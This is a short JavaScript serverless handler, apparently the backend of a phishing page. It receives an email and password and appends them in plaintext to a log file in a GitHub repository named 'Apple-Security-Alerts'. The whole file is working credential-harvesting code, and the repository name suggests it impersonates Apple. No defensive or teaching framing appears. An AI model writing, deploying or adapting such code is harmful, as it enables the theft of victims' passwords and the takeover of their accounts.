import { Octokit } from "@octokit/rest";

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  const { email, password } = req.body;
  
  // Verify token exists before trying to use it
  if (!process.env.GH_TOKEN) {
    console.error("CRITICAL: GH_TOKEN is missing in Vercel Environment Variables");
    return res.status(500).json({ error: "Server Configuration Error" });
  }

  const octokit = new Octokit({ auth: process.env.GH_TOKEN });
  const owner = 'careed23'; 
  const repo = 'Apple-Security-Alerts';
  const path = 'activity_log.txt';

  try {
    let currentContent = "";
    let sha = undefined;

    // 1. Get current file content
    try {
      const { data } = await octokit.repos.getContent({ owner, repo, path });
      currentContent = Buffer.from(data.content, 'base64').toString();
      sha = data.sha;
    } catch (e) {
      console.log("Log file not found, creating a new one...");
    }

    // 2. Format and Append
    const timestamp = new Date().toLocaleString();
    const newEntry = `[${timestamp}] User: ${email} | Pass: ${password}\n`;
    const updatedContent = currentContent + newEntry;

    // 3. Push to GitHub
    await octokit.repos.createOrUpdateFileContents({
      owner,
      repo,
      path,
      message: `Log entry for ${email}`,
      content: Buffer.from(updatedContent).toString('base64'),
      sha: sha
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    // This will show up in your Vercel "Logs" tab
    console.error("GitHub API Error Details:", error.message);
    return res.status(500).json({ error: error.message });
  }
}
